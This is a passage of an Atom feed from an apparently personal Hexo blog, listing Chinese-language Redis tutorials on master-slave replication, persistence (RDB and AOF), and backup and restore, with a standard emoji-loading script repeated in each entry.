    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis与其他应用的集成</title>
    <link href="https://marnm.github.io//posts/5188e636/"/>
    <id>https://marnm.github.io//posts/5188e636/</id>
    <published>2022-06-07T04:50:43.000Z</published>
    <updated>2022-06-07T04:56:53.661Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis配合MySQL使用</title>
    <link href="https://marnm.github.io//posts/3e3d973e/"/>
    <id>https://marnm.github.io//posts/3e3d973e/</id>
    <published>2022-06-07T04:50:32.000Z</published>
    <updated>2022-06-07T04:56:53.673Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis安装部署——Cluster集群</title>
    <link href="https://marnm.github.io//posts/e8376589/"/>
    <id>https://marnm.github.io//posts/e8376589/</id>
    <published>2022-06-07T04:50:08.000Z</published>
    <updated>2022-06-07T04:56:53.662Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis安装部署——Sentinel模式</title>
    <link href="https://marnm.github.io//posts/e78aaf59/"/>
    <id>https://marnm.github.io//posts/e78aaf59/</id>
    <published>2022-06-07T04:49:59.000Z</published>
    <updated>2022-06-07T04:56:53.664Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis安装部署——主从复制</title>
    <link href="https://marnm.github.io//posts/2acd829b/"/>
    <id>https://marnm.github.io//posts/2acd829b/</id>
    <published>2022-06-07T04:49:49.000Z</published>
    <updated>2022-06-07T05:07:26.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#xFF08;&#x5B9E;&#x73B0;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF09;"><a href="#Redis&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#xFF08;&#x5B9E;&#x73B0;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF09;" class="headerlink" title="Redis&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#xFF08;&#x5B9E;&#x73B0;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF09;"></a>Redis&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#xFF08;&#x5B9E;&#x73B0;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF09;</h1><h2 id="Redis&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;"><a href="#Redis&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;" class="headerlink" title="Redis&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;"></a>Redis&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;</h2><p>&#x4E3B;&#x5E93;&#x4F1A;&#x57FA;&#x4E8E;<code>pingcheck</code>&#x65B9;&#x5F0F;&#x68C0;&#x67E5;&#x4ECE;&#x5E93;&#x662F;&#x5426;&#x5728;&#x7EBF;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x7EBF;&#x5219;&#x76F4;&#x63A5;&#x540C;&#x6B65;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x81F3;&#x4ECE;&#x670D;&#x52A1;&#x7AEF;&#xFF0C;&#x4ECE;&#x670D;&#x52A1;&#x7AEF;&#x4E5F;&#x53EF;&#x4EE5;&#x4E3B;&#x52A8;&#x53D1;&#x9001;&#x540C;&#x6B65;&#x8BF7;&#x6C42;&#x5230;&#x4E3B;&#x670D;&#x52A1;&#x5355;&#xFF0C;&#x4E3B;&#x5E93;&#x5982;&#x679C;&#x662F;&#x542F;&#x52A8;&#x4E86;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#x65F6;&#xFF0C;&#x4F1A;&#x4E0D;&#x65AD;&#x7684;&#x540C;&#x6B65;&#x6570;&#x636E;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#xFF0C;&#x4E3B;&#x5E93;&#x4E00;&#x65E6;&#x6536;&#x5230;&#x4ECE;&#x5E93;&#x7684;&#x540C;&#x6B65;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x4E3B;&#x5E93;&#x4F1A;&#x5C06;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x505A;&#x5FEB;&#x7167;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x540C;&#x6B65;&#x7ED9;&#x4ECE;&#x5E93;&#xFF0C;&#x4ECE;&#x5E93;&#x5F97;&#x5230;&#x4EE5;&#x540E;&#x662F;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x4E2D;&#xFF08;&#x78C1;&#x76D8;&#xFF09;&#xFF0C;&#x800C;&#x540E;&#x628A;&#x8BE5;&#x6587;&#x52A0;&#x88C5;&#x8F7D;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#x5B8C;&#x6210;&#x6570;&#x636E;&#x91CD;&#x5EFA;&#xFF0C;&#x94FE;&#x5F0F;&#x590D;&#x5236;&#x4E5F;&#x540C;&#x6B65;&#x5982;&#x6B64;&#xFF0C;&#x56E0;&#x4E3A;&#x4E3B;&#x662F;&#x4E0D;&#x533A;&#x5206;&#x662F;&#x771F;&#x6B63;&#x7684;&#x4E3B;&#xFF0C;&#x8FD8;&#x662F;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x7684;&#x4ECE;&#x3002;</p><p><strong>1. &#x542F;&#x52A8;slave</strong></p><p><strong>2. slave&#x4F1A;&#x5411;master&#x53D1;&#x9001;&#x540C;&#x6B65;&#x547D;&#x4EE4;&#xFF0C;&#x8BF7;&#x6C42;&#x4E3B;&#x5E93;&#x4E0A;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x8BBA;&#x4ECE;&#x670D;&#x52A1;&#x7AEF;&#x662F;&#x5426;&#x662F;&#x7B2C;&#x4E00;&#x6B21;&#x8FDE;&#x63A5;&#xFF0C;master&#x6B64;&#x65F6;&#x90FD;&#x4F1A;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x540E;&#x53F0;&#x7684;&#x5B50;&#x8FDB;&#x7A0B;&#x5C06;&#x6570;&#x636E;&#x5FEB;&#x7167;&#x4FDD;&#x5B58;&#x5728;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x53D1;&#x9001;&#x7ED9;slave</strong></p><p><strong>3. salve&#x6536;&#x5230;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x4EE5;&#x540E;&#xFF0C;&#x4F1A;&#x4FDD;&#x5B58;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x800C;&#x540E;&#x628A;&#x6587;&#x4EF6;&#x91CD;&#x8F7D;&#x88C5;&#x5165;&#x5185;&#x5B58;</strong></p><h2 id="&#x7279;&#x70B9;"><a href="#&#x7279;&#x70B9;" class="headerlink" title="&#x7279;&#x70B9;"></a>&#x7279;&#x70B9;</h2><p>1&#x3001; &#x4E00;&#x4E2A;Master&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;slave&#xFF1B;<br>2&#x3001; &#x652F;&#x6301;&#x94FE;&#x5F0F;&#x590D;&#x5236;&#xFF08;&#x4E00;&#x4E2A;slave&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x5176;&#x4ED6;&#x7684;slave&#x7684;slave&#xFF09;&#xFF1B;<br>3&#x3001; Master&#x4EE5;&#x975E;&#x963B;&#x585E;&#x65B9;&#x5F0F;&#x540C;&#x6B65;&#x6570;&#x636E;&#x81F3;slave&#xFF08;master&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x5904;&#x7406;&#x591A;&#x4E2A;slave&#x7684;&#x8BFB;&#x5199;&#x8BF7;&#x6C42;&#xFF0C;slave&#x7AEF;&#x5728;&#x540C;&#x6B65;&#x6570;&#x636E;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x975E;&#x963B;&#x585E;&#x65B9;&#x5F0F;&#xFF09;</p><h2 id="&#x542F;&#x7528;&#x590D;&#x5236;&#x529F;&#x80FD;"><a href="#&#x542F;&#x7528;&#x590D;&#x5236;&#x529F;&#x80FD;" class="headerlink" title="&#x542F;&#x7528;&#x590D;&#x5236;&#x529F;&#x80FD;"></a>&#x542F;&#x7528;&#x590D;&#x5236;&#x529F;&#x80FD;</h2><p><strong>Slave</strong></p><pre><code>vim redis.conf</code></pre><pre><code class="ini">slaveof Redis&#x4E3B;&#x670D;&#x52A1;&#x5668;IP&#x5730;&#x5740; &#x7AEF;&#x53E3;</code></pre><p>&#x91CD;&#x542F;redis</p><h2 id="sentinel&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x9AD8;&#x53EF;&#x7528;"><a href="#sentinel&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x9AD8;&#x53EF;&#x7528;" class="headerlink" title="sentinel&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x9AD8;&#x53EF;&#x7528;"></a>sentinel&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x9AD8;&#x53EF;&#x7528;</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x4E3B;&amp;#x4ECE;&amp;#x67B6;&amp;#x6784;&amp;#xFF08;&amp;#x5B9E;&amp;#x73B0;&amp;#x8BFB;&amp;#x5199;&amp;#x5206;&amp;#x79BB;&amp;#xFF09;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x4E3B;&amp;#x4EC
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis持久化</title>
    <link href="https://marnm.github.io//posts/119ed1dc/"/>
    <id>https://marnm.github.io//posts/119ed1dc/</id>
    <published>2022-06-07T04:49:38.000Z</published>
    <updated>2022-06-07T05:07:06.344Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis&#x6301;&#x4E45;&#x5316;"><a href="#Redis&#x6301;&#x4E45;&#x5316;" class="headerlink" title="Redis&#x6301;&#x4E45;&#x5316;"></a>Redis&#x6301;&#x4E45;&#x5316;</h1><p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;Redis&#x5DE5;&#x4F5C;&#x65F6;&#x6240;&#x6709;&#x6570;&#x636E;&#x90FD;&#x96C6;&#x90FD;&#x662F;&#x5B58;&#x50A8;&#x4E0E;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#xFF0C;&#x4E0D;&#x8BBA;&#x662F;&#x5426;&#x6709;&#x78C1;&#x76D8;&#x4E0A;&#x7684;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#xFF0C;&#x90FD;&#x662F;&#x5DE5;&#x4F5C;&#x4E8E;&#x5185;&#x5B58;&#x5F53;&#x4E2D;&#xFF0C;redis&#x672C;&#x8EAB;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5185;&#x5B58;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x628A;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x76F8;&#x5173;&#x7684;&#x5B58;&#x50A8;&#x90FD;&#x5B58;&#x50A8;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x5982;&#x679C;redis&#x5D29;&#x6E83;&#x6216;&#x65AD;&#x7535;&#x5BFC;&#x81F4;&#x6240;&#x6709;&#x6570;&#x636E;&#x4E22;&#x5931;&#xFF0C;&#x6240;&#x4EE5;redis&#x63D0;&#x4F9B;&#x4E86;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#x6765;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x53EF;&#x9760;&#x6027;&#xFF0C;redis&#x6301;&#x4E45;&#x5316;&#x6709;&#x4E24;&#x79CD;&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#x3002;RDB&#x548C;AOF</p><h2 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h2><p>RDB&#x5B58;&#x50A8;&#x4E3A;&#x4E8C;&#x8FDB;&#x5236;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x9ED8;&#x8BA4;&#x542F;&#x52A8;&#x7684;&#x6301;&#x4E45;&#x5316;&#x673A;&#x5236;&#xFF0C;&#x6309;&#x4E8B;&#x5148;&#x6307;&#x5B9A;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x5468;&#x671F;&#x6027;&#x5730;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x81F3;&#x78C1;&#x76D8;&#xFF0C;&#x4F7F;&#x7528;save&#x547D;&#x4EE4;&#x5373;&#x53EF;&#x8BBE;&#x5B9A;&#x5468;&#x671F;&#x548C;&#x7B56;&#x7565;&#x5373;&#x53EF;&#xFF1B;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x9ED8;&#x8BA4;&#x4E3A;dump.rdb&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x4EE5;&#x7528;save&#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x4FDD;&#x5B58;&#x81F3;&#x6570;&#x636E;&#x81F3;&#x78C1;&#x76D8;&#x3002;</p><p><strong>&#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;</strong></p><p>1&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x4E5F;&#x53EF;&#x663E;&#x5F0F;&#x4F7F;&#x7528;<code>SAVE</code>&#x548C;<code>BGSAVE</code>&#x547D;&#x4EE4;&#x542F;&#x52A8;&#x5FEB;&#x7167;&#x4FDD;&#x5B58;&#x673A;&#x5236;&#xFF1B;<br>2&#x3001;&#x501F;&#x52A9;&#x4E8E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6240;&#x5B9A;&#x4E49;&#x7684;save&#x548C;&#x7B56;&#x7565;&#x8FDB;&#x884C;&#x4FDD;&#x5B58;&#xFF1B;</p><p><strong>SAVE&#xFF1A;</strong> &#x662F;&#x540C;&#x6B65;&#x4FDD;&#x5B58;&#xFF0C;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x4F7F;&#x7528;save&#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#x65F6;&#xFF0C;&#x662F;&#x5728;redis&#x4E3B;&#x7EBF;&#x7A0B;&#x4E2D;&#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#xFF1B;&#x56E0;&#x4E3A;redis&#x7684;&#x4E3B;&#x7EBF;&#x7A0B;&#x662F;&#x7528;&#x4E8E;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6B64;&#x65F6;&#x4F1A;&#x963B;&#x585E;&#x6240;&#x6709;&#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;&#xFF0C;&#x6BCF;&#x6B21;&#x7684;&#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#x90FD;&#x662F;&#x628A;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5B8C;&#x6574;&#x7684;&#x4FDD;&#x5B58;&#x4E00;&#x4EFD;&#xFF0C;&#x5E76;&#x975E;&#x662F;&#x589E;&#x91CF;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x800C;&#x8FD8;&#x6709;&#x5927;&#x91CF;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x6B64;&#x65B9;&#x5F0F;&#x4F1A;&#x5F15;&#x8D77;&#x5927;&#x91CF;&#x7684;I/O&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;redis&#x6027;&#x80FD;&#x4E0B;&#x964D;</p><p><strong>BGSAVE&#xFF1A;</strong> &#x5F02;&#x6B65;&#x65B9;&#x5F0F;&#xFF0C;&#x5C06;&#x7ACB;&#x5373;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#xFF0C;&#x4F46;&#x81EA;&#x52A8;&#x5728;&#x540E;&#x53F0;&#x4FDD;&#x6301;&#x64CD;&#x4F5C;&#xFF0C;&#x6240;&#x4EE5;BGSAVE&#x547D;&#x4EE4;&#x542F;&#x52A8;&#x4EE5;&#x540E;&#xFF0C;&#x524D;&#x53F0;&#x4E0D;&#x4F1A;&#x88AB;&#x5360;&#x7528;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;&#x662F;&#x4E0D;&#x4F1A;&#x88AB;&#x963B;&#x585E;&#xFF08;&#x4E3B;&#x8FDB;&#x7A0B;&#x4E0D;&#x4F1A;&#x88AB;&#x963B;&#x585E;&#xFF09;</p><p>&#x5982;&#x679C;&#x662F;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;save&#xFF0C;&#x90A3;&#x4E48;redis&#x5728;&#x6301;&#x4E45;&#x5316;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5219;&#x4F1A;&#x5F00;&#x542F;&#x53E6;&#x5916;&#x7684;&#x8FDB;&#x7A0B;&#x53BB;&#x5904;&#x7406;&#xFF0C;&#x4E0D;&#x4F1A;&#x963B;&#x585E;redis&#x7684;&#x4E3B;&#x8FDB;&#x7A0B;</p><p>RDB&#x6301;&#x4E45;&#x5316;&#x4E0D;&#x8DB3;&#x4E4B;&#x5904;&#x5219;&#x662F;&#xFF0C;&#x4E00;&#x65E6;&#x6570;&#x636E;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#xFF0C;&#x7531;&#x4E8E;RDB&#x7684;&#x6570;&#x636E;&#x4E0D;&#x662F;&#x6700;&#x65B0;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x57FA;&#x4E8E;RDB&#x6062;&#x590D;&#x8FC7;&#x6765;&#x7684;&#x6570;&#x636E;&#x4E00;&#x5B9A;&#x4F1A;&#x6709;&#x4E00;&#x90E8;&#x5206;&#x6570;&#x636E;&#x4E22;&#x5931;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;RDB&#x4FDD;&#x5B58;&#x4E4B;&#x540E;&#x7684;&#x4FEE;&#x6539;&#x6570;&#x636E;&#x4F1A;&#x4E22;&#x5931;&#x3002;</p><h2 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h2><p><strong>AOF&#xFF1A;</strong> Append Only File&#xFF0C;&#x6709;&#x7740;&#x66F4;&#x597D;&#x7684;&#x6301;&#x4E45;&#x5316;&#x80FD;&#x529B;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;AOF&#x7C7B;&#x4F3C;&#x4E8E;MySQL&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;&#x8BB0;&#x5F55;&#x6BCF;&#x4E00;&#x6B21;Redis&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#xFF0C;&#x4EE5;&#x987A;&#x5E8F;IO&#x65B9;&#x5F0F;&#x9644;&#x52A0;&#x5728;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x7684;&#x5C3E;&#x90E8;&#xFF0C;&#x662F;&#x4F7F;&#x7528;&#x8FFD;&#x52A0;&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x8FD9;&#x4E5F;&#x53EB;&#x505A;&#x4E00;&#x79CD;<strong>&#x9644;&#x52A0;&#x65E5;&#x5FD7;</strong>&#x7C7B;&#x578B;&#x7684;&#x6301;&#x4E45;&#x5316;&#x673A;&#x5236;&#xFF0C;&#x7531;&#x4E8E;&#x6BCF;&#x4E00;&#x6B21;&#x7684;&#x64CD;&#x7EB5;&#x90FD;&#x8BB0;&#x5F55;&#xFF0C;&#x5219;&#x4F1A;&#x968F;&#x7740;&#x65F6;&#x95F4;&#x589E;&#x957F;&#x800C;&#x589E;&#x5927;&#x6587;&#x4EF6;&#x7684;&#x5BB9;&#x91CF;&#xFF0C;&#x5E76;&#x4E14;&#x6709;&#x4E9B;&#x8BB0;&#x5F55;&#x7684;&#x547D;&#x4EE4;&#x662F;&#x591A;&#x4F59;&#x7684;&#xFF0C;AOF&#x4E0D;&#x50CF;RDB&#xFF0C;RDB&#x662F;&#x4FDD;&#x5B58;&#x6570;&#x636E;&#x96C6;&#x7684;&#x672C;&#x8EAB;</p><p>&#x4F46;&#x662F;Redis&#x8FDB;&#x7A0B;&#x80FD;&#x591F;&#x81EA;&#x52A8;&#x7684;&#x53BB;&#x626B;&#x63CF;&#x8FD9;&#x4E2A;&#x5BF9;&#x5E94;&#x7684;AOF&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x5176;&#x4E2D;&#x4E00;&#x4E9B;&#x5197;&#x4F59;&#x7684;&#x64CD;&#x4F5C;&#x7ED9;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#xFF0C;&#x4EE5;&#x5B9E;&#x73B0;&#x5C06;&#x6765;&#x4E00;&#x6B21;&#x6027;&#x628A;&#x6570;&#x636E;&#x6062;&#x590D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;Redis&#x80FD;&#x591F;&#x5408;&#x5E76;&#x91CD;&#x5199;AOF&#x7684;&#x6301;&#x4E45;&#x5316;&#x6587;&#x4EF6;&#xFF0C;&#x7531;BGREWRITEAOF&#x547D;&#x4EE4;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;BGREWIRTEAOF&#x547D;&#x4EE4;&#x662F;&#x5DE5;&#x4F5C;&#x4E8E;&#x540E;&#x53F0;&#x7684;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x91CD;&#x5199;&#x540E;Redis&#x5C06;&#x4F1A;&#x4EE5;&#x5FEB;&#x7167;&#x7684;&#x65B9;&#x5F0F;&#x5C06;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4EE5;&#x547D;&#x4EE4;&#x65B9;&#x5F0F;&#x4FDD;&#x5B58;&#x5728;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6700;&#x540E;&#x66FF;&#x6362;&#x539F;&#x6765;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x65B9;&#x5F0F;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x8BFB;&#x53D6;&#x65E7;AOF&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x662F;&#x76F4;&#x63A5;&#x5C06;&#x5F53;&#x524D;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x76F4;&#x63A5;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;&#x4E8E;MySQL&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x547D;&#x4EE4;&#x4E00;&#x6837;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x6301;&amp;#x4E45;&amp;#x5316;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x6301;&amp;#x4E45;&amp;#x5316;&quot; class=&quot;headerlink&quot; title=&quot;Redis&amp;#x6301;&amp;#x4E45;&amp;#x5316;&quot;&gt;&lt;/a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis的数据备份与恢复</title>
    <link href="https://marnm.github.io//posts/e3fb0a3e/"/>
    <id>https://marnm.github.io//posts/e3fb0a3e/</id>
    <published>2022-06-07T04:49:33.000Z</published>
    <updated>2022-06-07T05:06:48.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis&#x7684;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;"><a href="#Redis&#x7684;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;" class="headerlink" title="Redis&#x7684;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;"></a>Redis&#x7684;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ol><li>&#x542F;&#x52A8;Redis</li></ol><p>&#x8FDB;&#x5165;Redis&#x76EE;&#x5F55;</p><pre><code>redis-cli</code></pre><ol start="2"><li><p>&#x6570;&#x636E;&#x5907;&#x4EFD;</p><p> SAVE</p></li></ol><p>&#x8BE5;&#x547D;&#x4EE4;&#x5C06;&#x5728;redis&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E2D;&#x521B;&#x5EFA;dump.rdb&#x6587;&#x4EF6;&#x3002;</p><ol start="3"><li><p>&#x6062;&#x590D;&#x6570;&#x636E;</p><pre><code> config get dir</code></pre></li></ol><p>&#x4EE5;&#x4E0A;&#x547D;&#x4EE4;config get dir&#x8F93;&#x51FA;&#x7684;redis&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E3A;/usr/local/redis/bin</p><p>&#x505C;&#x6B62;Redis&#x670D;&#x52A1;</p><p>&#x62F7;&#x8D1D;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5230;/usr/local/redis/bin&#x76EE;&#x5F55;&#x4E0B;</p><p>&#x91CD;&#x542F;redis</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><pre><code>redis-server --service-install 